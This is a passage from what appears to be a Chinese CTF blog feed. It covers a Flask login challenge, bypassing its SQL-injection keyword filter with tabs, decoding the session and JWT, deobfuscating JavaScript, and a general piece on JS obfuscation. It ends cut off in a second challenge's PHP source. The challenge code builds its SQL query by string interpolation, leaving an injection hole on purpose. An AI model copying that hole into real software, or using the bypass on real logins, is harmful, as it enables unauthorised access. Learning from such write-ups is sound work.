class="token string">"'or"</span><span class="token punctuation">,</span>            <span class="token string">"/or"</span><span class="token punctuation">,</span>            <span class="token string">" and"</span><span class="token punctuation">,</span>            <span class="token string">"'and"</span><span class="token punctuation">,</span>            <span class="token string">"/and"</span><span class="token punctuation">,</span>            <span class="token string">"'like"</span><span class="token punctuation">,</span>            <span class="token string">" like"</span><span class="token punctuation">,</span>            <span class="token string">"/like"</span><span class="token punctuation">,</span>            <span class="token string">"'where"</span><span class="token punctuation">,</span>            <span class="token string">" where"</span><span class="token punctuation">,</span>            <span class="token string">"/where"</span><span class="token punctuation">,</span>            <span class="token string">"%00"</span><span class="token punctuation">,</span>            <span class="token string">"null"</span><span class="token punctuation">,</span>            <span class="token string">"admin'"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        matching_value <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span>                value                <span class="token keyword">for</span> value <span class="token keyword">in</span> invalid_entries                <span class="token keyword">if</span> value <span class="token keyword">in</span> loweruser <span class="token keyword">or</span> value <span class="token keyword">in</span> lowerpass            <span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token boolean">None</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span>        <span class="token keyword">if</span> matching_value<span class="token punctuation">:</span>            error <span class="token operator">=</span> <span class="token punctuation">(</span>                <span class="token string-interpolation"><span class="token string">f"Invalid entry in username and/or password fields. Please try again."</span></span>            <span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span>        conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"chal.db"</span><span class="token punctuation">)</span>        cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        query <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"SELECT secret FROM login_details WHERE username = '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">' AND password = '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">';"</span></span>        result <span class="token operator">=</span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">)</span>        user <span class="token operator">=</span> result<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user<span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>            session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username            session<span class="token punctuation">[</span><span class="token string">"secret"</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"profile"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            error <span class="token operator">=</span> <span class="token string">"Invalid login credentials. Please try again."</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"landing.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/profile"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        secret <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"secret"</span><span class="token punctuation">)</span>        key <span class="token operator">=</span> <span class="token string">"0"</span>        <span class="token keyword">if</span> <span class="token string">"secret"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>            key <span class="token operator">=</span> <span class="token string">"1"</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>            <span class="token string">"profile.html"</span><span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">,</span> secret<span class="token operator">=</span>secret<span class="token punctuation">,</span> key<span class="token operator">=</span>key        <span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        error <span class="token operator">=</span> <span class="token string">"You are not logged in. Please log in first."</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span><span class="token keyword">def</span> <span class="token function">add_cache_control</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Cache-Control"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"no-store, no-cache, must-revalidate, max-age=0"</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Pragma"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"no-cache"</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Expires"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-1"</span>    <span class="token keyword">return</span> response<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过对代码进行审计可以看到再login路由下存在SQL注入，也就是登录处，但是对字符进行了白名单限制</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        loweruser <span class="token operator">=</span> username<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>        lowerpass <span class="token operator">=</span> password<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>        invalid_entries <span class="token operator">=</span> invalid_entries <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"//"</span><span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"'1"</span><span class="token punctuation">,</span> <span class="token string">" 1"</span><span class="token punctuation">,</span> <span class="token string">" true"</span><span class="token punctuation">,</span> <span class="token string">"'true"</span><span class="token punctuation">,</span> <span class="token string">" or"</span><span class="token punctuation">,</span> <span class="token string">"'or"</span><span class="token punctuation">,</span> <span class="token string">"/or"</span><span class="token punctuation">,</span> <span class="token string">" and"</span><span class="token punctuation">,</span> <span class="token string">"'and"</span><span class="token punctuation">,</span> <span class="token string">"/and"</span><span class="token punctuation">,</span> <span class="token string">"'like"</span><span class="token punctuation">,</span> <span class="token string">" like"</span><span class="token punctuation">,</span> <span class="token string">"/like"</span><span class="token punctuation">,</span> <span class="token string">"'where"</span><span class="token punctuation">,</span> <span class="token string">" where"</span><span class="token punctuation">,</span> <span class="token string">"/where"</span><span class="token punctuation">,</span> <span class="token string">"%00"</span><span class="token punctuation">,</span> <span class="token string">"null"</span><span class="token punctuation">,</span> <span class="token string">"admin'"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试使用tab键来绕过空格（space）<br><img src="https://img-blog.csdnimg.cn/direct/93bfeaf0295c43d48ef70cbd87a486ad.png" alt="123"><br>发现能够成功登录<br><img src="https://img-blog.csdnimg.cn/direct/52755f94cb094aa9a92e157b803d8a97.png" alt="123"><br>也没有发现什么，结合源码还给了一个SQL文件</p><p><strong>schema_sql</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> login_details <span class="token punctuation">(</span>    id <span class="token keyword">INTEGER</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> AUTOINCREMENT<span class="token punctuation">,</span>    username <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    password <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span> secret <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试查看一下secret字段<br><img src="https://img-blog.csdnimg.cn/direct/b91ec43d9b3841cb9fa9d01fdbca11e5.png" alt="465"><br>这时候发现session内容变多了，结合前面登陆成功所给的secret，不免会想到session相关题目，将此处的session进行解码使用<code>flask-unsign</code><br><img src="https://img-blog.csdnimg.cn/direct/bb4db8d78a7941d9a60ca39d80f62c98.png" alt="456"><br>将得到的密文进行JWT解码<br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoibml0ZXtpc190aGlzX3RoZV9mbGFnP30iLCJuYW1lIjoiVHJ5IGFuZCBnZXQgdGhlIGZsYWchIiwiZGVzYyI6IihmdW5jdGlvbihfMHhkOGZiZGIsXzB4MjQyNDgzKXt2YXIgXzB4NTVkYzdjPV8weDNlN2QsXzB4M2FlZmExPV8weGQ4ZmJkYigpO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4M2Q3ODQ3PS1wYXJzZUludChfMHg1NWRjN2MoMHg5MikpLzB4MSoocGFyc2VJbnQoXzB4NTVkYzdjKDB4OTYpKS8weDIpK3BhcnNlSW50KF8weDU1ZGM3YygweDhlKSkvMHgzKigtcGFyc2VJbnQoXzB4NTVkYzdjKDB4OTMpKS8weDQpK3BhcnNlSW50KF8weDU1ZGM3YygweDk0KSkvMHg1K3BhcnNlSW50KF8weDU1ZGM3YygweDhmKSkvMHg2KigtcGFyc2VJbnQoXzB4NTVkYzdjKDB4OGIpKS8weDcpK3BhcnNlSW50KF8weDU1ZGM3YygweDkxKSkvMHg4Ky1wYXJzZUludChfMHg1NWRjN2MoMHg4YykpLzB4OSoocGFyc2VJbnQoXzB4NTVkYzdjKDB4OTUpKS8weGEpK3BhcnNlSW50KF8weDU1ZGM3YygweDkwKSkvMHhiO2lmKF8weDNkNzg0Nz09PV8weDI0MjQ4MylicmVhaztlbHNlIF8weDNhZWZhMVsncHVzaCddKF8weDNhZWZhMVsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4NGIyODljKXtfMHgzYWVmYTFbJ3B1c2gnXShfMHgzYWVmYTFbJ3NoaWZ0J10oKSk7fX19KF8weDQ0ZTcsMHhiNGJmMSkpO2Z1bmN0aW9uIF8weDNlN2QoXzB4M2JjYTMzLF8weDIxZjY0OCl7dmFyIF8weDQ0ZTc3Yz1fMHg0NGU3KCk7cmV0dXJuIF8weDNlN2Q9ZnVuY3Rpb24oXzB4M2U3ZGU2LF8weDMxZmViYyl7XzB4M2U3ZGU2PV8weDNlN2RlNi0weDhiO3ZhciBfMHg1ZTU4NTA9XzB4NDRlNzdjW18weDNlN2RlNl07cmV0dXJuIF8weDVlNTg1MDt9LF8weDNlN2QoXzB4M2JjYTMzLF8weDIxZjY0OCk7fWZ1bmN0aW9uIHd1dF9pc190aGlzX25vdygpe3ZhciBfMHg1OTQ5NTY9XzB4M2U3ZDtjb25zb2xlWydsb2cnXShfMHg1OTQ5NTYoMHg4ZCkpO31mdW5jdGlvbiBfMHg0NGU3KCl7dmFyIF8weDQ1ZDA4ZT1bJzlsbENnTm8nLCdhSFIwY0hNNkx5OW5hWFJvZFdJdVkyOXRMMmx6YUdGdUxYTjFjbUZ1WVM5amFHRnNiR1Z1WjJVdicsJzkyNG9mb3BKQicsJzE1NzA5OHR0REd2YScsJzI0MjU3Mjc3YW1kc2RZJywnNDY1NzY4MFdhaWNKRCcsJzh4SHRxc2QnLCcxNjI1Mld6cWZjcycsJzExOTg3OTVlVUFmSUQnLCc0MDI1MTEwR1hveWJNJywnNzk2ODJRU254c1MnLCc4NHhCSnNzdyddO18weDQ0ZTc9ZnVuY3Rpb24oKXtyZXR1cm4gXzB4NDVkMDhlO307cmV0dXJuIF8weDQ0ZTcoKTt9IiwiaWF0IjoxNTE2MjM5MDIyfQ.bTHY_Rrkc2mn2xwJe1tP_PeGUftqNoWZFLO2yBH2B5Q</code></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"header"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>    <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"payload"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"flag"</span><span class="token operator">:</span> <span class="token string">"nite&#123;is_this_the_flag?&#125;"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Try and get the flag!"</span><span class="token punctuation">,</span>    <span class="token property">"desc"</span><span class="token operator">:</span> <span class="token string">"(function(_0xd8fbdb,_0x242483)&#123;var _0x55dc7c=_0x3e7d,_0x3aefa1=_0xd8fbdb();while(!![])&#123;try&#123;var _0x3d7847=-parseInt(_0x55dc7c(0x92))/0x1*(parseInt(_0x55dc7c(0x96))/0x2)+parseInt(_0x55dc7c(0x8e))/0x3*(-parseInt(_0x55dc7c(0x93))/0x4)+parseInt(_0x55dc7c(0x94))/0x5+parseInt(_0x55dc7c(0x8f))/0x6*(-parseInt(_0x55dc7c(0x8b))/0x7)+parseInt(_0x55dc7c(0x91))/0x8+-parseInt(_0x55dc7c(0x8c))/0x9*(parseInt(_0x55dc7c(0x95))/0xa)+parseInt(_0x55dc7c(0x90))/0xb;if(_0x3d7847===_0x242483)break;else _0x3aefa1['push'](_0x3aefa1['shift']());&#125;catch(_0x4b289c)&#123;_0x3aefa1['push'](_0x3aefa1['shift']());&#125;&#125;&#125;(_0x44e7,0xb4bf1));function _0x3e7d(_0x3bca33,_0x21f648)&#123;var _0x44e77c=_0x44e7();return _0x3e7d=function(_0x3e7de6,_0x31febc)&#123;_0x3e7de6=_0x3e7de6-0x8b;var _0x5e5850=_0x44e77c[_0x3e7de6];return _0x5e5850;&#125;,_0x3e7d(_0x3bca33,_0x21f648);&#125;function wut_is_this_now()&#123;var _0x594956=_0x3e7d;console['log'](_0x594956(0x8d));&#125;function _0x44e7()&#123;var _0x45d08e=['9llCgNo','aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv','924ofopJB','157098ttDGva','24257277amdsdY','4657680WaicJD','8xHtqsd','16252Wzqfcs','1198795eUAfID','4025110GXoybM','79682QSnxsS','84xBJssw'];_0x44e7=function()&#123;return _0x45d08e;&#125;;return _0x44e7();&#125;"</span><span class="token punctuation">,</span>    <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1516239022</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可看出<code>desc</code>处对代码进行了混淆，尝试反混淆</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">(function(topic<span class="token punctuation">,</span> b) <span class="token punctuation">&#123;</span>  <span class="token comment">/** @type &#123;function (number, ?): ?&#125; */</span>  var getter = _0x3e7d;  var out = topic();  for (;!!<span class="token punctuation">[</span><span class="token punctuation">]</span>;) <span class="token punctuation">&#123;</span>    try <span class="token punctuation">&#123;</span>      <span class="token comment">/** @type &#123;number&#125; */</span>      var a = -parseInt(getter(<span class="token number">146</span>)) / <span class="token number">1</span> * (parseInt(getter(<span class="token number">150</span>)) / <span class="token number">2</span>) + parseInt(getter(<span class="token number">142</span>)) / <span class="token number">3</span> * (-parseInt(getter(<span class="token number">147</span>)) / <span class="token number">4</span>) + parseInt(getter(<span class="token number">148</span>)) / <span class="token number">5</span> + parseInt(getter(<span class="token number">143</span>)) / <span class="token number">6</span> * (-parseInt(getter(<span class="token number">139</span>)) / <span class="token number">7</span>) + parseInt(getter(<span class="token number">145</span>)) / <span class="token number">8</span> + -parseInt(getter(<span class="token number">140</span>)) / <span class="token number">9</span> * (parseInt(getter(<span class="token number">149</span>)) / <span class="token number">10</span>) + parseInt(getter(<span class="token number">144</span>)) / <span class="token number">11</span>;      if (a === b) <span class="token punctuation">&#123;</span>        break;      <span class="token punctuation">&#125;</span> else <span class="token punctuation">&#123;</span>        out<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span>(out<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span>());      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> catch (_0x4b289c) <span class="token punctuation">&#123;</span>      out<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span>(out<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span>());    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>)(_0x44e7<span class="token punctuation">,</span> <span class="token number">740337</span>);<span class="token comment">/** * @param &#123;number&#125; opt_attributes * @param &#123;?&#125; deepDataAndEvents * @return &#123;?&#125; */</span>function _0x3e7d(opt_attributes<span class="token punctuation">,</span> deepDataAndEvents) <span class="token punctuation">&#123;</span>  var args = _0x44e7();  return _0x3e7d = function(opt_attributes<span class="token punctuation">,</span> deepDataAndEvents) <span class="token punctuation">&#123;</span>    <span class="token comment">/** @type &#123;number&#125; */</span>    opt_attributes = opt_attributes - <span class="token number">139</span>;    var pageY = args<span class="token punctuation">[</span>opt_attributes<span class="token punctuation">]</span>;    return pageY;  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> _0x3e7d(opt_attributes<span class="token punctuation">,</span> deepDataAndEvents);<span class="token punctuation">&#125;</span><span class="token comment">/** * @return &#123;undefined&#125; */</span>function wut_is_this_now() <span class="token punctuation">&#123;</span>  <span class="token comment">/** @type &#123;function (number, ?): ?&#125; */</span>  var prepArgs = _0x3e7d;  console<span class="token punctuation">[</span><span class="token string">"log"</span><span class="token punctuation">]</span>(prepArgs(<span class="token number">141</span>));<span class="token punctuation">&#125;</span><span class="token comment">/** * @return &#123;?&#125; */</span>function _0x44e7() <span class="token punctuation">&#123;</span>  <span class="token comment">/** @type &#123;Array&#125; */</span>  var aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv = <span class="token punctuation">[</span><span class="token string">"9llCgNo"</span><span class="token punctuation">,</span> <span class="token string">"aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv"</span><span class="token punctuation">,</span> <span class="token string">"924ofopJB"</span><span class="token punctuation">,</span> <span class="token string">"157098ttDGva"</span><span class="token punctuation">,</span> <span class="token string">"24257277amdsdY"</span><span class="token punctuation">,</span> <span class="token string">"4657680WaicJD"</span><span class="token punctuation">,</span> <span class="token string">"8xHtqsd"</span><span class="token punctuation">,</span> <span class="token string">"16252Wzqfcs"</span><span class="token punctuation">,</span> <span class="token string">"1198795eUAfID"</span><span class="token punctuation">,</span> <span class="token string">"4025110GXoybM"</span><span class="token punctuation">,</span> <span class="token string">"79682QSnxsS"</span><span class="token punctuation">,</span> <span class="token string">"84xBJssw"</span><span class="token punctuation">]</span>;  <span class="token comment">/**   * @return &#123;?&#125;   */</span>  _0x44e7 = function() <span class="token punctuation">&#123;</span>    return aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv;<span class="token comment">//base64解码为https://github.com/ishan-surana/challenge/</span>  <span class="token punctuation">&#125;</span>;  return _0x44e7();<span class="token punctuation">&#125;</span>;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag就在里面，但是由于比赛结束，flag已经删除。。。</p><h2 id="js混淆与反混淆"><a href="#js混淆与反混淆" class="headerlink" title="js混淆与反混淆"></a>js混淆与反混淆</h2><h3 id="JS混淆"><a href="#JS混淆" class="headerlink" title="JS混淆"></a><strong>JS混淆</strong></h3><p>JavaScript混淆是一种通过修改源代码，使其难以阅读和理解的技术。这种技术的目的是增加代码的复杂性，从而防止逆向工程、减缓恶意攻击和防止未经授权的复制。混淆通常包括以下几个方面：</p><ol><li><strong>变量和函数名重命名：</strong> 将代码中的变量名和函数名替换为无意义、短小或难以理解的名称。</li><li><strong>控制流混淆：</strong> 修改代码的控制流程，使其变得复杂和难以分析。这可能包括添加无用的分支、条件语句重组等。</li><li><strong>字符串和常量加密：</strong> 将字符串和常量进行加密或编码，使其在运行时动态解码，增加代码分析的难度。</li><li><strong>添加噪音和无用代码：</strong> 在代码中添加无用的语句、注释或函数，使其更加混乱，增加理解的难度。</li></ol><h3 id="JavaScript反混淆"><a href="#JavaScript反混淆" class="headerlink" title="JavaScript反混淆"></a>JavaScript反混淆</h3><p>JavaScript反混淆是一种尝试还原混淆代码的过程，以便更容易地理解和分析代码。反混淆的目标是还原代码的可读性，以便于审查、维护或逆向工程。反混淆通常包括以下一些方法：</p><ol><li><strong>还原变量和函数名：</strong> 将混淆过的变量名和函数名还原为更有意义的名称，以提高代码的可读性。</li><li><strong>简化控制流：</strong> 通过移除无用的分支或还原原始的控制流程，使代码更易于理解。</li><li><strong>解密字符串和常量：</strong> 解密加密的字符串和常量，还原它们的原始值。</li><li><strong>去除噪音和无用代码：</strong> 删除添加的无用语句、注释或函数，以简化代码。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="赛事WP" scheme="http://3143047748.github.io/categories/%E8%B5%9B%E4%BA%8BWP/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-WEB之[HarekazeCTF2019]encode_and_encode</title>
    <link href="http://3143047748.github.io/2023/12/13/BUUCTF-WEB%E4%B9%8B-HarekazeCTF2019-encode-and-encode/"/>
    <id>http://3143047748.github.io/2023/12/13/BUUCTF-WEB%E4%B9%8B-HarekazeCTF2019-encode-and-encode/</id>
    <published>2023-12-13T12:43:10.000Z</published>
    <updated>2023-12-13T12:46:26.948Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token 